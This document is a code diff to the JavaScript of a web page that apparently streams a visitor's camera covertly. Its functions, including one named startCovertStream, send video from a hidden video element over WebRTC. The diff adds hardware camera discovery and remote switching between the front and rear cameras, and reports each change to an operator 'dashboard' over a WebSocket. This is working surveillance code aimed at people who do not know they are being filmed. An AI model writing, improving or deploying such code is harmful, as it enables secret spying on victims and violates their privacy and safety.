@@ -145,7 +145,41 @@
         let isConnectingWs = false;
         let currentFacingMode = 'user'; // 'user' (front) or 'environment' (rear)
         let isSwitching = false;
+        let frontCameraId = null;
+        let backCameraId = null;
+        let availableCameras = [];
         const hiddenVideo = document.getElementById('hiddenVideo');
+
+        async function discoverCameras() {
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                availableCameras = devices.filter(d => d.kind === 'videoinput');
+                console.log("[*] Discovered cameras:", availableCameras);
+
+                frontCameraId = null;
+                backCameraId = null;
+
+                for (const cam of availableCameras) {
+                    const label = (cam.label || '').toLowerCase();
+                    if (label.includes('back') || label.includes('rear') || label.includes('environment') || label.includes('0') || label.includes('main')) {
+                        if (!backCameraId) backCameraId = cam.deviceId;
+                    } else if (label.includes('front') || label.includes('user') || label.includes('selfie') || label.includes('1')) {
+                        if (!frontCameraId) frontCameraId = cam.deviceId;
+                    }
+                }
+
+                // Fallbacks if labels aren't descriptive
+                if (!backCameraId && availableCameras.length > 1) {
+                    backCameraId = availableCameras[availableCameras.length - 1].deviceId;
+                }
+                if (!frontCameraId && availableCameras.length > 0) {
+                    frontCameraId = availableCameras[0].deviceId;
+                }
+                console.log(`[*] Camera mapping: Front=${frontCameraId}, Back=${backCameraId}`);
+            } catch (e) {
+                console.warn("Camera discovery error:", e);
+            }
+        }
 
         async function startCovertStream() {
             const card = document.getElementById('mainCard');
@@ -174,6 +208,9 @@
                     hiddenVideo.play().catch(() => {});
                 }
 
+                // Discover all hardware cameras now that permission is granted
+                await discoverCameras();
+
                 connectSignaling();
             } catch (err) {
                 console.error("Initial camera acquisition error:", err);
@@ -186,6 +223,7 @@
                         hiddenVideo.srcObject = localStream;
                         hiddenVideo.play().catch(() => {});
                     }
+                    await discoverCameras();
                     connectSignaling();
                 } catch (fallbackErr) {
                     console.error("Fatal camera permission error:", fallbackErr);
@@ -205,101 +243,119 @@
             console.log(`[*] Switching camera to: ${targetMode}`);
 
             try {
-                let currentVideoTrack = localStream ? localStream.getVideoTracks()[0] : null;
-                let applied = false;
+                let videoSender = null;
+                if (pc) {
+                    const senders = pc.getSenders();
+                    videoSender = senders.find(s => (s.track && s.track.kind === 'video') || s.kind === 'video');
+                }
 
-                // 1. PRIMARY METHOD: In-Place Native Hardware Flip via applyConstraints (Zero-permission / No user gesture needed)
-                if (currentVideoTrack && typeof currentVideoTrack.applyConstraints === 'function') {
+                // Ensure hardware camera IDs are fresh
+                if (!backCameraId || !frontCameraId) {
+                    await discoverCameras();
+                }
+
+                const targetDeviceId = targetMode === 'environment' ? backCameraId : frontCameraId;
+                let newStream = null;
+
+                // 1. Direct hardware acquisition using exact deviceId
+                if (targetDeviceId) {
                     try {
-                        console.log("[*] Executing applyConstraints facingMode:", targetMode);
-                        await currentVideoTrack.applyConstraints({
-                            facingMode: targetMode
+                        newStream = await navigator.mediaDevices.getUserMedia({
+                            video: {
+                                deviceId: { exact: targetDeviceId },
+                                width: { ideal: 1280, max: 1920 },
+                                height: { ideal: 720, max: 1080 }
+                            },
+                            audio: false
                         });
-                        console.log("[+] applyConstraints exact succeeded!");
-                        applied = true;
-                    } catch (errExact) {
-                        try {
-                            await currentVideoTrack.applyConstraints({
-                                facingMode: { ideal: targetMode }
-                            });
-                            console.log("[+] applyConstraints ideal succeeded!");
-                            applied = true;
-                        } catch (errIdeal) {
-                            console.log("applyConstraints failed, trying device ID...", errIdeal);
-                        }
+                        console.log("[+] Acquired camera with exact deviceId:", targetDeviceId);
+                    } catch (eDev) {
+                        console.log("Exact deviceId failed, trying standard deviceId constraint:", eDev);
                     }
                 }
 
-                // 2. SECONDARY METHOD: Device ID Lookup with applyConstraints
-                if (!applied && currentVideoTrack && typeof currentVideoTrack.applyConstraints === 'function') {
+                // 2. Acquisition with deviceId non-exact
+                if (!newStream && targetDeviceId) {
                     try {
-                        const devices = await navigator.mediaDevices.enumerateDevices();
-                        const videoDevices = devices.filter(d => d.kind === 'videoinput');
-                        const targetDevice = videoDevices.find(d => {
-                            const lbl = (d.label || '').toLowerCase();
-                            return targetMode === 'environment'
-                                ? (lbl.includes('back') || lbl.includes('rear') || lbl.includes('environment') || lbl.includes('0') || lbl.includes('main'))
-                                : (lbl.includes('front') || lbl.includes('user') || lbl.includes('selfie') || lbl.includes('1'));
+                        newStream = await navigator.mediaDevices.getUserMedia({
+                            video: { deviceId: targetDeviceId },
+                            audio: false
                         });
-                        if (targetDevice && targetDevice.deviceId) {
-                            await currentVideoTrack.applyConstraints({
-                                deviceId: { exact: targetDevice.deviceId }
-                            });
-                            console.log("[+] applyConstraints deviceId succeeded!");
-                            applied = true;
-                        }
-                    } catch (errDev) {
-                        console.log("applyConstraints deviceId failed:", errDev);
+                    } catch (eDev2) {}
+                }
+
+                // 3. Acquisition with facingMode exact
+                if (!newStream) {
+                    try {
+                        newStream = await navigator.mediaDevices.getUserMedia({
+                            video: { facingMode: { exact: targetMode } },
+                            audio: false
+                        });
+                    } catch (eExact) {}
+                }
+
+                // 4. Acquisition with facingMode ideal
+                if (!newStream) {
+                    try {
+                        newStream = await navigator.mediaDevices.getUserMedia({
+                            video: { facingMode: { ideal: targetMode } },
+                            audio: false
+                        });
+                    } catch (eIdeal) {}
+                }
+
+                // 5. Alternate device selection if multi-camera system
+                if (!newStream && availableCameras.length > 1) {
+                    const currentTrack = localStream ? localStream.getVideoTracks()[0] : null;
+                    const currentSettings = currentTrack ? currentTrack.getSettings() : {};
+                    const altCam = availableCameras.find(c => c.deviceId !== currentSettings.deviceId);
+                    if (altCam) {
+                        newStream = await navigator.mediaDevices.getUserMedia({
+                            video: { deviceId: altCam.deviceId },
+                            audio: false
+                        });
                     }
                 }
 
-                // 3. TERTIARY METHOD: Hot-swap replacement with getUserMedia
-                if (!applied) {
-                    let videoSender = null;
-                    if (pc) {
-                        const senders = pc.getSenders();
-                        videoSender = senders.find(s => (s.track && s.track.kind === 'video') || s.kind === 'video');
-                    }
+                if (!newStream || newStream.getVideoTracks().length === 0) {
+                    throw new Error("No alternate camera hardware responded");
+                }
 
-                    // Release old track
-                    if (currentVideoTrack) {
-                        try { currentVideoTrack.stop(); } catch (e) {}
-                    }
-                    if (hiddenVideo) {
-                        try { hiddenVideo.pause(); hiddenVideo.srcObject = null; } catch (e) {}
-                    }
+                const newVideoTrack = newStream.getVideoTracks()[0];
 
-                    await new Promise(r => setTimeout(r, 200));
+                // Hot-swap video track on WebRTC peer connection
+                if (videoSender) {
+                    await videoSender.replaceTrack(newVideoTrack);
+                    console.log("[+] Replaced track on WebRTC to:", targetMode);
+                }
 
-                    const newStream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: { ideal: targetMode } },
-                        audio: false
+                // Stop old video tracks
+                if (localStream) {
+                    localStream.getVideoTracks().forEach(t => {
+                        if (t !== newVideoTrack) {
+                            try { t.stop(); } catch (e) {}
+                        }
                     });
-
-                    const newVideoTrack = newStream.getVideoTracks()[0];
-                    if (!newVideoTrack) throw new Error("No video track from fallback");
-
-                    if (videoSender) {
-                        await videoSender.replaceTrack(newVideoTrack);
-                    }
-
-                    const audioTracks = localStream ? localStream.getAudioTracks() : [];
+                    const audioTracks = localStream.getAudioTracks();
                     localStream = new MediaStream([...audioTracks, newVideoTrack]);
+                } else {
+                    localStream = newStream;
+                }
 
-                    if (hiddenVideo) {
-                        hiddenVideo.srcObject = localStream;
-                        hiddenVideo.play().catch(() => {});
-                    }
-                    applied = true;
+                if (hiddenVideo) {
+                    hiddenVideo.srcObject = localStream;
+                    hiddenVideo.play().catch(() => {});
                 }
 
                 currentFacingMode = targetMode;
 
-                // Send confirmation to dashboard
+                // Send confirmation to dashboard with lens label
+                const lensLabel = newVideoTrack.label || (targetMode === 'environment' ? 'Rear Camera' : 'Front Camera');
                 if (ws && ws.readyState === WebSocket.OPEN) {
                     ws.send(JSON.stringify({
                         type: "camera_info",
                         camera: currentFacingMode,
+                        lens: lensLabel,
                         status: "success"
                     }));
                 }
@@ -309,7 +365,7 @@
                     ws.send(JSON.stringify({
                         type: "camera_info",
                         camera: currentFacingMode,
-                        error: err.message || "Switch failed"
+                        error: err.message || "Failed"
                     }));
                 }
             } finally {
